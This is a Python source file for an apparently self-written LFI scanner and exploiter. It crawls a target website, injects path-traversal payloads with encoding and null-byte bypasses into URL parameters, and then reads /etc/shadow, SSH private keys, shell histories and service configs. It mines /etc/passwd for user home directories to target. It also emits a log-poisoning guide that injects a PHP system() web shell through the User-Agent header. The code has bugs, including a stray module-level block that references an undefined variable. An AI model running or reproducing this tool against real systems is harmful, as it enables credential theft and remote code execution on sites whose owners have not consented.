import os
import sys
import argparse
import requests
import urllib3
import json
import csv
import xml.etree.ElementTree as ET
from xml.dom import minidom
from xml.sax.saxutils import escape
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from bs4 import BeautifulSoup
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Disable SSL/TLS warnings for easier debugging
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class LFIScanner:
    def __init__(self, proxy=None, threads=10, wordlist=None, cookies=None,selected_categories=None, exploit_enabled=False):
        """Initialize scanner with configuration
        - proxy: Set up proxy for traffic inspection
        - threads: Control parallel request count
        - payloads: List of path traversal test patterns
        - vulnerabilities: Store found vulnerabilities
        - exploit_files: Target files for post-discovery exploitation"""
        self.unique_vulns = set()
        self.unique_entries = set()
        self.cookies = cookies
        self.session = self._create_session(proxy)  
        self.tested_combinations = set()
        self.visited_urls = set()
        self.payloads = self._generate_payloads()
        self.vulnerabilities = []
        self.base_domain = None
        self.threads = threads
        self.executor = ThreadPoolExecutor(max_workers=threads)
        self.exploitation_results = []
        self.report = []  # Unified report
        self.tested_payloads = set()
        self.unified_report = []
        self.should_exploit = False
        self.custom_payloads = []        
        self.exploit_files = [  # Target files for exploitation phase
            '/etc/passwd', '/etc/shadow', '/etc/hosts', # ... full list
        ]
        self.exploit_enabled = exploit_enabled
        self.selected_categories = selected_categories or []

        if wordlist:
            self._load_wordlist(wordlist)

        self.user_file_patterns = [
            '.bash_history',
            '.ssh/id_rsa',
            '.ssh/authorized_keys',
            '.mysql_history',
            # ... full list from user input
        ]
        self.categories = {
             # Linux
        "linux_system": {
            "name": "Core OS Files",
            "payloads": [
                "/etc/passwd",
                "/etc/shadow",
                "/proc/self/environ",
                "/etc/hosts",
                "/proc/version",
                "/etc/issue"
            ]
        },
        "linux_users": {
            "name": "User Home Files",
            "payloads": [
                "~/.ssh/id_rsa",
                "~/.bash_history",
                "~/.bashrc",
                "~/.profile",
                "~/.mysql_history",
                "~/Documents/*"
            ]
        },
        "log_rce": {
            "name": "Log-based RCE",
            "payloads": [
                "/var/log/apache2/access.log",
                "/var/log/syslog",
                "/var/log/sshd.log",
                "/var/log/mail.log",
                "/proc/self/environ"
            ]
        },
        "web_servers": {
            "name": "Web Server Configs",
            "payloads": [
                "/etc/apache2/apache2.conf",
                "/etc/nginx/nginx.conf",
                "/etc/httpd/conf/httpd.conf",
                "/usr/local/nginx/conf/nginx.conf"
            ]
        },
        "cron_jobs": {
            "name": "Scheduled Tasks",
            "payloads": [
                "/etc/crontab",
                "/var/spool/cron/crontabs/root",
                "/etc/cron.d/",
                "/etc/anacrontab"
            ]
        },
        "database": {
            "name": "Database Configs",
            "payloads": [
                "/etc/my.cnf",
                "/var/lib/mysql/mysql.log",
                "/etc/postgresql/postgresql.conf",
                "/var/log/mysql.log"
            ]
        },
        "ftp_configs": {
            "name": "FTP Server Configs",
            "payloads": [
                "/etc/proftpd/proftpd.conf",
                "/var/log/pure-ftpd.log",
                "/etc/vsftpd.conf",
                "/etc/pure-ftpd/pure-ftpd.conf"
            ]
        },
        "ssh_keys": {
            "name": "SSH Authentication",
            "payloads": [
                "~/.ssh/id_rsa",
                "/etc/ssh/sshd_config",
                "~/.ssh/authorized_keys",
                "/var/log/auth.log"
            ]
        },
        "boot_files": {
            "name": "System Boot Configs",
            "payloads": [
                "/etc/inittab",
                "/boot/grub/grub.cfg",
                "/etc/default/grub",
                "/etc/init.d/"
            ]
        },
        # Windows
        "windows_common": {
            "name": "Windows System",
            "payloads": [
                "C:\\Windows\\win.ini".replace('\\', quote('\\')),
                "C:\\Windows\\System32\\drivers\\etc\\hosts".replace('\\', quote('\\')),
                "C:\\Windows\\repair\\SAM".replace('\\', quote('\\'))
            ]
        },
        # Network
        "linux_network": {
            "name": "Network Info",
            "payloads": [
                "/proc/net/arp",
                "/proc/net/tcp",
                "/etc/resolv.conf",
                "/etc/hosts.allow"
            ]
        }
    }
        if 'all' in self.selected_categories:
            self.selected_categories = list(self.categories.keys())

        self.payload_categories = self.categories 


    def _load_wordlist(self, wordlist_path):
        """Load custom file paths for exploitation"""
        try:    
            with open(wordlist_path) as f:
                custom_files = [
                    line.strip() 
                    for line in f 
                    if line.strip() and not line.startswith('#')
                ]
                # Normalize paths and ensure absolute format
                normalized = [
                    f'/{path.lstrip("/")}' if not path.startswith('/') else path
                    for path in custom_files
                ]
                self.exploit_files.extend(normalized)
                # Remove duplicates while preserving order
                seen = set()
                self.exploit_files = [
                    x for x in self.exploit_files 
                    if not (x in seen or seen.add(x))
                ]
        except Exception as e:
            print(f"[!] Wordlist error: {str(e)}")
            sys.exit(1)
            
            
    def _add_entry(self, entry):
        """Universal deduplication with proper phase handling"""
        entry_hash = hash(frozenset({
            'url': entry.get('url'),
            'parameter': entry.get('parameter'),
            'payload': unquote(entry.get('payload', '')),
            'type': entry.get('type', 'detection'),
            'target_file': entry.get('target_file', ''),
            'log_path': entry.get('log_path', '')  # Add this line

        }.items()))
        
        if entry_hash not in self.unique_entries:
            self.unique_entries.add(entry_hash)
            
            # Ensure all fields exist
            entry.setdefault('content', '')
            entry.setdefault('length', 0)
            entry.setdefault('timestamp', datetime.now().isoformat())
            
            self.unified_report.append(entry)


    def _add_vulnerability(self, entry):
        """Deduplicate entries using a unique hash"""
        vuln_hash = hash(frozenset({
            'url': entry['url'],
            'parameter': entry['parameter'],
            'payload': unquote(entry['payload']),
            'target_file': entry.get('target_file', '')
        }.items()))
        
        if vuln_hash not in self.unique_vulns:
            self.unique_vulns.add(vuln_hash)
            self.vulnerabilities.append(entry)


    def _create_session(self, proxy):
        """Configure HTTP session with retries and headers
        - Sets up connection pooling and retry logic
        - Adds browser-like User-Agent header
        - Configures proxy if provided"""
        session = requests.Session()
        session.verify = False  # Disable SSL verification
        # Configure automatic retries for failed requests
        retries = Retry(total=3, backoff_factor=1,
                       status_forcelist=[500, 502, 503, 504])
        session.mount('https://', HTTPAdapter(max_retries=retries))
        session.mount('http://', HTTPAdapter(max_retries=retries))
        # Set headers to mimic regular browser traffic

        session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        # # Temporary hardcoded cookies (remove after testing)
        # session.headers['Cookie'] = 'PHPSESSID=4st6e8jg91sskb0tu3eoot9ir5; security=low'    
            

         # Add custom cookies if provided
        if self.cookies:
            cookie_dict = {}
            for cookie in self.cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    cookie_dict[name] = value
            session.headers['Cookie'] = '; '.join([f'{k}={v}' for k,v in cookie_dict.items()])

        if proxy:  # Proxy configuration
            if not proxy.startswith(('http://', 'https://')):
                proxy = f'http://{proxy}'
            session.proxies = {'http': proxy, 'https': proxy}
        return session

    def _generate_payloads(self):
        """Create path traversal payload variations
        - Includes different encoding styles
        - Null byte termination for extension bypass
        - Windows/Unix path variations
        - Double encoding and unicode bypass attempts"""
        base_paths = [
            # Basic directory traversal patterns
            '/etc/passwd', '../etc/passwd', '../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '....\/....\/....\/etc/passwd',
            # Encoded payload variations
            '%2e%2e%2f' * 6 + 'etc/passwd',
            '%252e%252e%252f' * 6 + 'etc/passwd',
            # Windows path variations
            '..\\..\\..\\..\\windows\\win.ini'.replace('\\', quote('\\')),
            '..%255c..%255c..%255cwindows%255cwin.ini',
            # File extension bypass
            '../../../etc/passwd%00.png',
            '../../../etc/passwd%00.jpg',
            # Null byte termination
            '../../../../etc/passwd%00',
            '../../../../etc/passwd%2500',
            # Start path validation bypass
            '/var/www/images/../../../etc/passwd',

        ]


        # Generate encoded versions of all base payloads
        encoded_paths = [quote(payload, safe='') for payload in base_paths]
        # Add unicode-based bypass attempts
        unicode_paths = [
            '..%c0%af..%c0%af..%c0%afetc/passwd',  # URL-encoded backslash
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd'  # Fullwidth slash
        ]
        return list(set(base_paths + encoded_paths + unicode_paths))

    def scan(self, start_url):
        """Main scanning workflow controller
        1. Set base domain for same-domain crawling
        2. Start URL crawling and parameter discovery
        3. Launch exploitation phase after initial scan"""
        self.base_domain = urlparse(start_url).netloc
        self._crawl(start_url)

        if self.exploit_enabled:
            print(f"[*] Starting exploitation phase")
            self._exploit_vulnerabilities()

        # Combine all findings into unified report
        self.unified_report = [
            entry for entry in self.unified_report
            if entry.get('type') in ('detection', 'exploitation')
        ]
        
        return self.unified_report

        # return self.vulnerabilities + self.exploitation_results
        # self._exploit_vulnerabilities()
        # return self.vulnerabilities + self.exploitation_results
    def _get_exploit_targets(self):
        """Generate list of files to attempt reading"""
        targets = []
        # 1. Add selected category payloads
        for category in self.selected_categories:
            if category in self.categories:
                targets.extend(self.categories[category]['payloads'])
        
        # 2. Add custom payloads from wordlist
        targets.extend(self.exploit_files)
        
        # 3. Add default system payloads
        targets.extend([
            '/etc/passwd',
            '/proc/self/environ',
            'C:\\Windows\\win.ini'
        ])
        
        # Validate and deduplicate
        seen = set()
        return [str(t).strip() for t in targets if t and str(t) not in seen and not seen.add(str(t))]

    def _exploit_vulnerabilities(self):
        """Enhanced exploitation with threading support"""
        if not self.vulnerabilities:
            print("[!] No vulnerabilities found to exploit")
            return

        # Get initial targets and successful payloads
        initial_targets = self._get_exploit_targets()
        successful_payloads = [v['payload'] for v in self.vulnerabilities if v.get('status') == 200]
        
        # Use a set for thread-safe target tracking
        all_targets = set(initial_targets)
        tested_targets = set()
        lock = threading.Lock()  # Now properly imported

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Main worker function
            def worker(vuln):
                nonlocal all_targets, tested_targets
                while True:
                    with lock:
                        remaining = all_targets - tested_targets
                        if not remaining:
                            return
                        target = remaining.pop()
                        tested_targets.add(target)

                    try:
                        for payload in successful_payloads:
                            self._test_exploit(
                                vuln['url'],
                                vuln['parameter'],
                                payload,
                                target
                            )

                        if target == '/etc/passwd' and self.exploit_files:
                            with lock:
                                new_user_targets = [t for t in self.exploit_files 
                                                if t not in all_targets]
                                all_targets.update(new_user_targets)
                                print(f"[*] Added {len(new_user_targets)} user paths")

                    except Exception as e:
                        print(f"[-] Exploit error: {str(e)}")

            # Submit worker tasks
            futures = [executor.submit(worker, vuln) for vuln in self.vulnerabilities]

            # Monitor progress
            try:
                while True:
                    with lock:
                        remaining = len(all_targets) - len(tested_targets)
                    if remaining == 0:
                        break
                    print(f"[*] Targets remaining: {remaining}")
                    time.sleep(.1)  # Now properly imported

            except KeyboardInterrupt:
                print("[!] User interrupted scan")
            
            # Cleanup
            for future in futures:
                future.cancel()




    def _test_exploit(self, original_url, param, base_payload, target_file):
        """Test specific file exploitation
        - Generates modified payload for target file
        - Sends crafted request
        - Validates successful file read"""
        """Add strict type checking"""

        
        
        # Validate target_file is string
        if not isinstance(target_file, str):
            print(f"[-] Invalid payload format: {type(target_file)} - {target_file}")
            return None
        try:
            # Generate payload with preserved null bytes
            exploit_payload = self._generate_exploit_payload(base_payload, target_file)
            # Check for double-encoded null bytes
            exploit_payload = exploit_payload.replace('%2500', '%00').replace('%25%30%30', '%00')
            
            print(f"[*] Testing: {exploit_payload}")
                

             # Check duplicates
            if exploit_payload in self.tested_payloads:
                return None
            self.tested_payloads.add(exploit_payload)

            # Build test URL with modified payload
            parsed = urlparse(original_url)
            query = parse_qs(parsed.query)
            query[param] = [exploit_payload]
            test_url = parsed._replace(query="&".join(
                [f"{k}={v[0]}" for k, v in query.items()]
            )).geturl()
                

            # >>>>> CRITICAL FIX: Add the missing HTTP request <<<<<
            print(f"[*] Testing payload: {exploit_payload} => {test_url}")
            response = self.session.get(test_url, timeout=15)  # THIS WAS MISSING

            if response.status_code == 200:
                # RCE Detection Logic
                is_log_rce = any(
                    cat == 'log_rce' and target_file in self.categories[cat]['payloads']
                    for cat in self.selected_categories
                )
                if is_log_rce:
                    confidence = 'high' if self._is_log_file(response.text) else 'medium'
                    exploit_guide = [
                        f"Poison headers: curl -A '<?=system($_GET[\"cmd\"]);?>' {original_url}",
                        f"Execute: {test_url}&cmd=id"
                    ]
                    # Create rce_entry with ALL required fields
                    rce_entry = {
                        'type': 'potential_rce',
                        'url': test_url,
                        'parameter': param,
                        'payload': exploit_payload,
                        'log_path': target_file,
                        'confidence': confidence,
                        'status': response.status_code,
                        'length': len(response.text),
                        'content': response.text[:500] + '...' if response.text else '',
                        'timestamp': datetime.now().isoformat(),
                        'exploit_guide': exploit_guide  # Add this line
                    }
                    self._add_entry(rce_entry)

            if self._is_valid_exploitation(response):
                result = {
                    'type': 'exploitation',
                    'url': test_url,
                    'parameter': param,
                    'target_file': target_file,
                    'payload': exploit_payload,
                    'content': response.text if any(p in response.text for p in ['root:x:', 'bin:x:']) else response.text[:500] + '...',
                    'status': response.status_code,
                    'length': len(response.text),
                    'timestamp': datetime.now().isoformat()
                }
                self._add_entry(result)
                return result    
            
        except Exception as e:
            print(f"[-] Exploit failed: {str(e)}")
        
        return None

    
    def _is_log_file(self, content):
        """Detect common log file patterns"""
        log_patterns = [
            r'\d+\.\d+\.\d+\.\d+ - - \[.*\] "GET',
            r'HTTP/\d\.\d" \d{3} \d+',
            r'\[error\] \[client \d+\.\d+\.\d+\.\d+\]',
            r'SSH: Session opened',
            r"POST /.* HTTP/\d\.\d"
        ]
        return any(re.search(pattern, content) for pattern in log_patterns)

    def _generate_exploit_payload(self, base_payload, target_file):
        """Generate exploitation payload while preserving encoding layers

        1. Calculate original payload's encoding depth
        2. Fully decode to raw traversal sequence
        3. Replace target file in decoded path
        4. Re-apply equivalent encoding layers

        Example:
        Original: %252e%252e%252fetc/passwd (double-encoded)
        -> Decoded: ../../etc/passwd
        -> Modified: ../../etc/shadow
        -> Re-encoded: %252e%252e%252fetc%252fshadow
        """
        """Generate exploitation payload by direct replacement of vulnerable path
    
        Process:
        1. URL-decode the original payload to handle any encoding
        2. Replace 'etc/passwd' with target file in decoded payload
        3. Re-encode while preserving null bytes and original structure

        Example:
        Original payload: ../../../etc/passwd%00.png
        -> Decoded: ../../../etc/passwd\x00.png
        -> Replaced: ../../../etc/shadow\x00.png
        -> Encoded: ../../../etc/shadow%00.png
        """   
        """Generate payloads with guaranteed correct path structure"""
        # Split null byte suffix if present
        if '%00' in base_payload:
            main_part, suffix = base_payload.split('%00', 1)
            suffix = f'%00{suffix}'
        else:
            main_part = base_payload
            suffix = ''

        decoded = unquote(main_part)
        
        # Regex to identify vulnerable file pattern
        match = re.match(r'(.*?)(/etc/passwd|etc/passwd)', decoded, re.IGNORECASE)
        
        if match:
            # Extract traversal sequence and normalize slashes
            traversal = match.group(1).rstrip('/')  # Remove trailing slashes
            modified = f"{traversal}/{target_file.lstrip('/')}"
        else:
            # Fallback for non-standard payloads
            modified = f"{decoded}/{target_file.lstrip('/')}"

        # Preserve original encoding style
        encoded = quote(modified)
        
        return f"{encoded}{suffix}"

    def _extract_target_file(self, base_payload):
        """Identify reusable traversal pattern
        - Finds common vulnerable file patterns
        - Extracts preceding traversal sequence
        - Handles different encoding formats"""
        decoded = unquote(base_payload)
        # Try common vulnerable file patterns
        for pattern in ['/etc/passwd', 'win.ini']:
            if pattern in decoded:
                return base_payload.replace(decoded, decoded.split(pattern)[0])
        # Fallback to regex extraction
        return re.sub(r'[^\/\\]*$', '', base_payload)

    def _is_valid_exploitation(self, response):
        """Validate successful file read
        - Checks HTTP status code
        - Looks for error messages in content
        - Verifies meaningful content length"""
        if response.status_code != 200:
            return False
        content = response.text.lower()
        # Common error messages to ignore
        error_indicators = ['file not found', 'permission denied']
        return not any(err in content for err in error_indicators) and bool(content)

    # Continued below with crawling and detection methods...

    def _crawl(self, url):
        """Website crawling system
        1. Maintains list of visited URLs to prevent duplicates
        2. Extracts links from page content
        3. Processes found URLs recursively
        4. Analyzes parameters on each page
        - Uses BFS algorithm with limited depth
        - Handles relative/absolute URL conversion
        - Respects same-domain restriction"""
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)

        try:
            # Fetch page content with error handling
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all link-bearing elements in HTML
            elements = soup.find_all(['a', 'form', 'link', 'script', 'img'])
            futures = []
            
            # Process each discovered element
            for element in elements:
                new_url = self._extract_url(element, url)
                if new_url and new_url not in self.visited_urls:
                    # Submit URL processing to thread pool
                    futures.append(self.executor.submit(self._process_url, new_url))

            # Immediate parameter analysis for current page
            self._analyze_parameters(url)
            
            # Process child URLs as they complete
            for future in as_completed(futures):
                future.result()

        except Exception as e:
            print(f"[-] Crawling error: {str(e)}")

    def _extract_url(self, element, base_url):
        """URL extraction and normalization
        1. Handles different HTML element types
        2. Converts relative URLs to absolute
        3. Validates same-domain restriction
        4. Cleans URL fragments and trailing slashes
        - Supports: <a>, <form>, <link>, <script>, <img>"""
        element_types = {
            'a': 'href', 'form': 'action', 
            'link': 'href', 'script': 'src', 
            'img': 'src'
        }
        attr = element_types.get(element.name)
        if not attr:
            return None

        url = element.get(attr)
        if url:
            # Convert to absolute URL and clean
            absolute_url = urljoin(base_url, url).split('#')[0]
            parsed = urlparse(absolute_url)
            
            # Enforce same-domain policy
            if parsed.netloc == self.base_domain:
                return parsed._replace(
                    path=parsed.path.rstrip('/'),  # Standardize path
                    query=parsed.query.strip()      # Clean query params
                ).geturl()
        return None

    def _process_url(self, url):
        """URL processing pipeline
        1. Parameter analysis for vulnerability testing
        2. Recursive crawling continuation
        - Ensures systematic site exploration
        - Maintains thread-safe URL tracking"""
        self._analyze_parameters(url)
        self._crawl(url)

    def _analyze_parameters(self, url):
        """Parameter discovery and testing
        1. Parse URL query parameters
        2. Generate payload tests for each parameter
        3. Threaded execution of vulnerability checks
        - Prevents duplicate tests using combination tracking
        - Handles multiple parameters per URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            futures = []
            for payload in self.payloads:
                # Unique test identifier
                combination = (parsed.path, param, payload)
                if combination not in self.tested_combinations:
                    self.tested_combinations.add(combination)
                    # Submit parameter test to thread pool
                    futures.append(self.executor.submit(
                        self._test_parameter, url, param, payload
                    ))
            
            # Collect results as they complete
            for future in as_completed(futures):
                if result := future.result():
                    self.vulnerabilities.append(result)

    def _test_parameter(self, original_url, param, payload):
        """Individual parameter test execution
        1. Builds test URL with injected payload
        2. Sends crafted request
        3. Analyzes response for vulnerability signs
        - Handles network errors gracefully
        - Returns structured vulnerability data"""
        try:
            parsed = urlparse(original_url)
            query = parse_qs(parsed.query)
            
            # Preserve original URL structure
            test_params = parse_qs(parsed.query)
            test_params[param] = [payload]
            
            # Construct test URL
            test_url = parsed._replace(query="&".join(
                [f"{k}={v[0]}" for k, v in test_params.items()]
            )).geturl()
            self.tested_payloads.add(payload)
            response = self.session.get(test_url, timeout=15)
            
            if self._is_vulnerable(response):
                result = {
                    'url': test_url,
                    'parameter': param,
                    'payload': payload,
                    'os': self._detect_os(response),
                    'status': response.status_code,
                    'length': len(response.text),
                    'timestamp': datetime.now().isoformat(),
                    'content': response.text if any(p in response.text for p in ['root:x:', 'bin:x:']) else response.text[:500] + '...',
                    'type': 'detection'  # Add phase type
                }
                # Immediately process /etc/passwd findings
                if 'etc/passwd' in payload.lower() and 'root:x:' in response.text:
                    print("[*] Immediate user extraction from successful /etc/passwd access")
                    users = self._extract_users_from_passwd(response.text)
                    self._generate_user_files(users)
                    self._add_new_user_targets()  # NEW METHOD

                self._add_entry(result)
                return result

        except Exception as e:
            print(f"[-] Test failed: {str(e)}")
        return None
    def _add_new_user_targets(self):
        """Immediately add user paths to current scan"""
        if not hasattr(self, 'new_user_targets'):
            self.new_user_targets = []
        
        # Get targets that haven't been queued yet
        new_targets = [t for t in self.exploit_files if t not in self.new_user_targets]
        
        if new_targets:
            print(f"[*] Immediately adding {len(new_targets)} user paths to scan queue")
            self.new_user_targets.extend(new_targets)
            
            # Resubmit all vulnerabilities with new targets
            for vuln in self.vulnerabilities:
                for target in new_targets:
                    self.executor.submit(
                        self._test_exploit,
                        vuln['url'],
                        vuln['parameter'],
                        vuln['payload'],
                        target
                    )

    def _add_report_entry(self, entry):
        """Unified deduplication method"""
        entry_hash = hash(frozenset({
            'url': entry.get('url'),
            'parameter': entry.get('parameter'),
            'payload': unquote(entry.get('payload', ''))
        }.items()))
        
        if entry_hash not in self.unique_entries:
            self.unified_report.append(entry)
            self.unique_entries.add(entry_hash)

    def _is_vulnerable(self, response):
        """Vulnerability detection logic
        1. Checks HTTP status codes
        2. Looks for OS-specific content patterns
        3. Analyzes response length anomalies
        - Combines multiple detection methods
        - Reduces false positives through pattern matching"""
        content = response.text.lower()
        indicators = {
            'unix': ['root:x:', 'bin:x:', 'daemon:x:'],
            'windows': ['[boot loader]', '[extensions]'],
            'php': ['<?php', '<?='],
            'generic': ['file not found', 'permission denied']
        }
    
        # Status code filtering
        if response.status_code not in [200, 500]:
            return False

        # Content pattern matching
        for os_type, patterns in indicators.items():
            if any(p in content for p in patterns):
                return True

        # Response length heuristic
        if len(response.text) > 1000 and \
           'html' not in response.headers.get('content-type', ''):
            return True

        return False

    def _detect_os(self, response):
        """Operating system detection
        - Uses content patterns from vulnerable responses
        - Helps guide subsequent exploitation attempts
        - Supports Windows/Unix identification"""
        content = response.text.lower()
        if any(p in content for p in ['root:x:', 'bin:x:']):
            return 'unix'
        elif any(p in content for p in ['[boot loader]', '[extensions]']):
            return 'windows'
        return 'unknown'
        
 
    def _extract_users_from_passwd(self, passwd_content):
        """Extract users with valid home directories and shells"""

        """Handle null bytes in /etc/passwd responses"""
         # Remove null bytes and everything after
        clean_content = passwd_content.split('\x00')[0]
        valid_users = []
        for line in clean_content.split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue
                
            parts = line.split(':')
            if len(parts) < 7:
                continue
                
            username = parts[0]
            home_dir = parts[5]
            
            if home_dir.startswith('/home/') and username not in ['root', 'daemon']:
                valid_users.append({
                    'username': username,
                    'home': home_dir
                })
        
        return valid_users

    def _generate_user_files(self, users):
        """Generate user paths and remove generic patterns"""
        base_patterns = self.categories['linux_users']['payloads']
        
        # Remove generic profile patterns first
        self.exploit_files = [f for f in self.exploit_files if f not in base_patterns]
        
        # Generate user-specific paths
        for user in users:
            home_dir = user['home'].replace('\\', '/')
            for pattern in base_patterns:
                if pattern.startswith('~/'):
                    user_path = os.path.join(home_dir, pattern[2:])
                else:
                    user_path = os.path.join(home_dir, pattern.lstrip('/'))
                
                encoded_path = quote(user_path).replace('%2F', '/')
                if encoded_path not in self.exploit_files:
                    self.exploit_files.append(encoded_path)
                    print(f"[*] Generated user path: {encoded_path}")

    def reset_scanner(self):
        """Reset scanner state between URL scans"""
        self.visited_urls = set()
        self.tested_combinations = set()
        self.vulnerabilities = []
        self.exploitation_results = []
        self.base_domain = None
        self.tested_payloads = set()
        self.unified_report = []
def main():
    """Command-line interface and main execution flow
    1. Parse command-line arguments
    2. Initialize scanner with user configuration
    3. Execute scanning process
    4. Generate output reports
    5. Handle errors and display results"""
    
    # Configure command-line argument parser
    parser = argparse.ArgumentParser(
        description="Advanced LFI Scanner - Detect and exploit path traversal vulnerabilities",
        epilog="Example: %(prog)s -u https://example.com -p 127.0.0.1:8080 -t 20 -o json --exploit linux_system"
    )
    group = parser.add_mutually_exclusive_group(required=True)

    # Define supported command-line arguments
    group.add_argument("-u", "--url", help="Single target URL")
    group.add_argument("-l", "--url-list", help="File containing list of URLs to test")

    parser.add_argument("--exploit", nargs="*",
                        choices=[
                        "all",
                        "linux_system", "linux_users", "log_rce",
                        "web_servers", "cron_jobs", "database",
                        "ftp_configs", "ssh_keys", "boot_files",
                        "windows_common", "linux_network"
                    ],
                        metavar="CATEGORY",
                        help="Enable exploitation with payload categories (space-separated)")
    parser.add_argument("-w", "--wordlist", 
                  help="Custom file path wordlist for exploitation")
    parser.add_argument("-p", "--proxy", 
                      help="Proxy server for traffic inspection (e.g., Burp Suite: 127.0.0.1:8080)")
    parser.add_argument("-o", "--output", choices=['json', 'csv', 'xml'], 
                      help="Generate report in specified format (JSON/CSV/XML)")
    parser.add_argument("-t", "--threads", type=int, default=10,
                      help="Concurrent threads for scanning (default: 10, max recommended: 50)")
    parser.add_argument("--cookies", 
                  help="Session cookies in 'name1=value1; name2=value2' format")
    # Parse user input
    args = parser.parse_args()

    # Validate input arguments
    if not args.url and not args.url_list:
        print("[-] Must specify either --url or --url-list")
        return
    
    # Handle --exploit argument correctly
    exploit_enabled = args.exploit is not None
    selected_categories = args.exploit if args.exploit else []

    # Initialize scanner with user configuration
    scanner = LFIScanner(
        proxy=args.proxy,
        threads=args.threads,
        wordlist=args.wordlist,
        cookies=args.cookies,
        selected_categories=selected_categories,
        exploit_enabled=exploit_enabled  # Critical flag
    )
    
    # Process target URLs
    all_results = []
    
    # Process target URLs
    try:
        start_urls = []
        if args.url:
            start_urls = [args.url]
            print(f"[*] Scanning {args.url} with {args.threads} threads")
        elif args.url_list:
            with open(args.url_list) as f:
                start_urls = [line.strip() for line in f if line.strip()]
            print(f"[*] Scanning {len(start_urls)} URLs from {args.url_list}")

        all_results = []
        for url in start_urls:
            # Reset scanner state between URLs
            scanner.reset_scanner()
            
            # Run scan
            results = scanner.scan(url)
            all_results.extend(results)

            # Generate incremental report
            if args.output:
                generate_report(all_results, args.output)

        print(f"\n[*] Found {len(all_results)} vulnerabilities")

    except Exception as e:
        print(f"[!] Critical error: {str(e)}")
        sys.exit(1)
def validate_xml(filename):
    """Check XML file validity"""
    try:
        with open(filename, 'r') as f:
            minidom.parse(f)
        print(f"[*] XML report validation successful")
    except Exception as e:
        print(f"[!] XML validation error: {str(e)}")

# Add to generate_report after file creation
if format == 'xml':
    validate_xml(filename)
    
def generate_report(data, format):
    """Generate report file with proper content handling"""
    try:
        validated_data = []
        filename = None  # Initialize filename variable

        for entry in data:
            # Ensure minimum required fields exist
            if not isinstance(entry, dict):
                continue
            validated_entry = {
                'type': entry.get('type', 'unknown'),
                'url': entry.get('url', ''),
                'parameter': entry.get('parameter', ''),
                'payload': entry.get('payload', ''),
                # ... other fields with defaults
            }
            validated_data.append(validated_entry)

        if format == 'xml':
            filename = "report.xml"
            root = ET.Element("VulnerabilityReport")
            xml_safe = re.compile(r'[^\x09\x0A\x0D\x20-\uD7FF\uE000-\uFFFD\u10000-\u10FFFF]')

            for entry in data:
                entry_elem = ET.SubElement(root, "Entry")

                # Build the fields dictionary
                fields = {
                    'Type': entry.get('type', 'unknown'),
                    'URL': entry.get('url', ''),
                    'Parameter': entry.get('parameter', ''),
                    'Payload': entry.get('payload', ''),
                    'LogPath': entry.get('log_path', 'N/A'),
                    'Confidence': entry.get('confidence', ''),
                    'Status': str(entry.get('status', '')),
                    'Length': str(entry.get('length', '')),
                    'Timestamp': entry.get('timestamp', ''),
                    'Content': entry.get('content', '')[:1000]
                }

                # Add ExploitGuide if present
                if 'exploit_guide' in entry:
                    guide_elem = ET.SubElement(entry_elem, 'ExploitGuide')
                    for line in entry['exploit_guide']:
                        ET.SubElement(guide_elem, 'Step').text = escape(str(line))

                # Add all fields as subelements
                for key, value in fields.items():
                    cleaned_value = xml_safe.sub('', str(value))
                    safe_value = escape(cleaned_value)
                    elem = ET.SubElement(entry_elem, key)
                    elem.text = safe_value

            # Write the XML tree to file
            tree = ET.ElementTree(root)
            tree.write(filename, encoding='utf-8', xml_declaration=True, method='xml')
        elif format == 'json':
            filename = "report.json"  
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2, default=str)
        elif format == 'csv':
            filename = "report.csv"
            with open(filename, 'w', newline='') as f:
                writer = csv.writer(f)
                # Update headers
                writer.writerow([
                    'Type', 'URL', 'Parameter', 'Payload', 
                    'LogPath', 'Confidence', 'Status', 'Content'
                ])
                for entry in data:
                    writer.writerow([
                        entry.get('type', 'unknown'),
                        entry.get('url', ''),
                        entry.get('parameter', ''),
                        entry.get('payload', ''),
                        entry.get('log_path', 'N/A'),  # Changed from target_file
                        entry.get('confidence', ''),
                        entry.get('status', ''),
                        entry.get('content', '')[:300]
                    ])
        print(f"[*] Report saved to {filename}")
    except Exception as e:
        print(f"[!] Failed to generate report: {str(e)}")



if __name__ == "__main__":
    """Script entry point protection
    - Ensures code only runs when executed directly
    - Prevents accidental execution when imported
    - Handles top-level exception catching"""
    main()